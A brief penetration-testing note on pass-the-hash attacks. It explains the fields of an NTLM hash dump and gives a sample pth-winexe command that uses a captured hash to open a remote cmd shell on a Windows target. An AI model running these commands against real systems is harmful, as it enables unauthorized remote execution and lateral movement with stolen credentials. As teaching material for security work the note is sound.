# Pass the Hash
We can attempt to pass any hashes that we obtained to other servers in hopes that we can leverage a password-reuse attack. 
## NTLM Hashes
Below is an example of an NTLM hash.
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8118cb8789b3a147c790db402b016a08:::
```
The parts of the has are as follows,
```
(UID):(UID NUM):(LM HASH):(NT HASH):(COMMENT):(USER HOME PATH):
```
The LM hash of `aad3b435b51404eeaad3b435b51404ee` means that no password is set.
## PTH-Toolkit
The [Pass the Hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit) is a modified version of the passing-the-hash tool collection https://code.google.com/p/passing-the-hash/ designed to be portable and work straight out of the box even on the most 'bare bones' systems.
#### pth-winexe
The `pth-winexe` program of the PTH-Toolkit attempts to use a captured NTLM hash to execute commands on the target server. Below is an example of it's usage,
```
root@demon:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:8118cb8789b3a147c790db402b016a08
root@demon:~# pth-winexe -U adminstrator% //10.10.10.100 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
...(SNIPPED)...
```
